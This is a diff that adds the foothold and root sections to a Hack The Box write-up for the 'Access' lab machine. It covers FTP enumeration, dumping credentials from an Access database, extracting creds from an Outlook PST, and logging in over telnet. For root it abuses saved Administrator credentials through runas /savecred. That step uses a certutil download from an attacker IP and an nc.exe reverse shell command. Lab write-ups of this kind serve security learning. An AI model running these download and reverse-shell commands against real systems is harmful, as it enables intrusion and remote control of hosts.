@@ -1,7 +1,7 @@
 ---
 title: "[HTB] Machine: Access"
 description: "[HTB] Machine: Access"
-date: 2023-06-07
+date: 2023-06-12
 menu:
   sidebar:
     name: "[HTB] Machine: Access"
@@ -53,3 +53,68 @@ Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
 ![](./images/1.png)
 
 ## Foothold/User
+- Let's enumerate `ftp`
+  - Traverse directories and download everything
+
+![](./images/2.png)
+
+- We see `Access Control` archive
+  - I tried unzipping with `unzip`, but had no success
+  - Using `7z` was more successful, since it asked for password
+  - So now we need to look for password
+
+![](./images/3.png)
+![](./images/4.png)
+
+- Let's check `backup` file
+  - It's a `Microsoft Access Database`
+  - We can use `mdbtools`
+    - `sudo apt install mdbtools`
+  - List the tables
+
+![](./images/5.png)
+
+- We see `auth_-_user` table
+  - Let's dump it
+
+![](./images/6.png)
+
+- We can try each password to unzip the `Access Control` archive
+
+![](./images/7.png)
+
+- After unzipping we get a `pst` file, which is `Microsoft Outlook email folder`
+  - I used `readpst`
+  - `sudo apt install pst-utils`
+
+![](./images/8.png)
+
+- It's a plain text file
+  - Just open it with  `less 'Access Control.mbox'`
+  - We see an email with creds
+
+![](./images/9.png)
+
+- We have open `telnet` port
+  - Let's connect with obtained creds
+
+![](./images/10.png)
+
+## Root
+- Let's enumerate for privesc
+  - We find a interesting `lnk` file
+  - It runs `runas` with `savecred` options
+  - Let's check `cmdkey` for saved credentials
+
+![](./images/11.png)
+![](./images/12.png)
+
+- We see that we have `ACCESS\Administrator`'s credentials saved
+  - Let's use them and get our root
+  - Download nc: `certutil -urlcache -f http://10.10.16.3:8000/shell.ps1 shell.ps1`
+  - And start reverse shell: `runas /user:ACCESS\Administrator /savecred "nc.exe 10.10.16.3 6666 -e cmd"`
+
+![](./images/13.png)
+![](./images/14.png)
+
+- Check [0xdf's blog](https://0xdf.gitlab.io/2019/03/02/htb-access.html) for other privesc paths
